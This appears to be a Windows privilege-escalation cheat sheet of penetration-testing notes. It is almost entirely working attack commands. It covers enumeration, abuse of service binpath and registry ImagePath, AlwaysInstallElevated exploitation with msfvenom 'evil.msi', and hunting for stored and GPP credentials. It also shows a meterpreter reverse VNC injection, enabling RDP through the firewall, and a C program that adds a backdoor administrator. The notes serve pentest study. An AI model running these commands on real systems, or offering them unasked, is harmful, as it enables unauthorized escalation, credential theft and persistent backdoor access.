#########################
# INFORMATION GATHERING #
#########################

 What system are we connected to? 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
--> Get the hostname and username (if available) 
hostname
echo %username%
--> Learn about your environment 
SET
echo %PATH%
--> List other users on the box 
net users
net user <username>
--> Networking/Routing Info 
ipconfig /all
route print
arp -A
--> Active Network Connections 
netstat -ano
--> Firewall Status (only on Win XP SP2 and above) 
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule all
--> Scheduled tasks 
schtasks /query /fo LIST /v
--> Check how Running processes link to started services 
tasklist /SVC       
--> Windows services that are started: 
net start
--> Driver madness (3rd party drivers may have holes) 
DRIVERQUERY

# WMIC

Windows Management Instrumentation Command Line 
Windows XP requires admin 
--> Use wmic_info.bat script for automation 
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
    
--> System Info 
wmic COMPUTERSYSTEM get TotalPhysicalMemory,caption
wmic CPU Get /Format:List
--> Check patch level 
wmic qfe get Caption,Description,HotFixID,InstalledOn
Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing
Search patches for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
Examples: 
Windows 2K SP4 - Windows 7 (x86): KiTrap0D (KB979682) 
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682"  
Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass)) 
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"


# Find writeable files
dir /a-r-d /s /b
/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
/s means recurse subdirectories
/b means bare format. Path and filename only.



#######################
# Vulnerable Services #
#######################

# TOOLS
- icacls
DACL for files and folders

- accesschk.exe
DACL for registry keys, files, processes, users and groups, and services
For Windows XP, version 5.2 is needed: https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
Useful feature: it returns objects to which a particular user or group may have write access

accesschk.exe -uwcqv "User" * 
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services

# UNQUOTED SERVICE PATHS
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """ 
icacls "C:\Program Files (x86)\Program Folder" 
sc qc Service1


# INSECURE SERVICE PERMISSIONS
Search for services that have a binary path (binpath) property which can be modified by non-Admin users.
*Windows XP shipped with several vulnerable built-in services. 

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv Everyone * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\ 

sc qc Service1

Modify the binpath parameter and restart the service: 
sc config <vuln-service> binpath= "net localgroup Administrators rosonsec /add" 
sc stop <vuln-service>
sc start <vuln-service>

Note - Might need to use the depend attribute explicitly: 
sc stop <vuln-service>
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
sc start <vuln-service>

# INSECURE REGISTRY PERMISSIONS

accesschk.exe -quvcw *		      	-->  DACLs of every service
accesschk.exe -quvcw Service1 	-->	 DACLs of one service

Change the Imagepath to our binary. It needs to restart the computer? or restarting the service is enough? Not sure!
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f


# AlwaysInstallElevated
AlwaysInstallElevated is a group policy setting that allows regular users the ability to install a MSI package with SYSTEM privileges.

If these 2 registry values are set to “1”, the system is vulnerable:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Exploitation:
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi


# Bypassing AV
- Veil-Evasion
Create your own executable by “compiling” PowerShell scripts
Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.

- Service executable in C#
https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/
https://github.com/mattymcfatty/unquotedPoC/blob/master/SimpleService.Designer.cs


######################
# STORED CREDENTIALS #
######################

Directories that contain the configuration files. These files either contain clear-text passwords or in a Base64 encoded format.
C:\sysprep.inf
C:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml 

When the box is connected to a Domain, look for Groups.xml in SYSVOL 
GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.
Search for other policy preference files that can have the optional “cPassword” attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

Automated Tools
Metasploit Module
post/windows/gather/credentials/gpp
post/windows/gather/enum_unattend
Powersploit
https://github.com/PowerShellMafia/PowerSploit
Get-GPPPassword
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon

Search filesystem:
Search for specific keywords:
dir /s *pass* == *cred* == *vnc* == *.config*

Search certain file types for a keyword
findstr /si password *.xml *.ini *.txt

Search for certain files
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini

Grep the registry for keywords (e.g. “passwords”)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password


#####################
# Exploit Suggester #
#####################
https://github.com/GDSSecurity/Windows-Exploit-Suggester
- Victim
systeminfo > systeminfo.txt
- Attacker
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py -d BulletinSearch.xlsx -i systeminfo.txt 


###############
# Getting GUI #
###############

--> Using meterpreter, inject vnc session: 
run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false
--> Enable RDP: 
netsh firewall set service RemoteDesktop enable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"
OR: 
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=udp
OR (meterpreter) 
run post/windows/manage/enable_rdp
https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ 

###################
# Creating users  #
###################

- CMD
net user /add rosonsec P@ssw0rd
net localgroup Administrators /add rosonsec
# probably not needed:
net localgroup "Remote Desktop Users" /add rosonsec

- useradd.c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
  int i;
  i=system ("net user rosonsec P@ssw0rd /add && net localgroup administrators rosonsec /add");
  return 0;
}

i686-w64-mingw32-gcc -o useradd.exe useradd.c
